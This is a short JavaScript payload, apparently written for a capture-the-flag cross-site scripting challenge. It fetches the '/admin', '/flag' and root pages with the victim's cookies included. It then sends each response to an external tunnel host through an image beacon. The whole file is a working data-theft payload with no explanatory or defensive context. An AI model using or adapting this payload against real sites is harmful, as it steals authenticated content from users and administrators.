(function () {
  function exfil(path) {
    return fetch(path, { credentials: 'include' })
      .then(r => r.text())
      .then(t => {
        new Image().src =
          'https://2212d23c8bc99266-185-240-49-214.serveousercontent.com/?d=' +
          encodeURIComponent('PATH=' + path + '\n' + t);
      });
  }

  exfil('/admin').catch(() => {});
  exfil('/flag').catch(() => {});
  exfil('/').catch(() => {});
})();
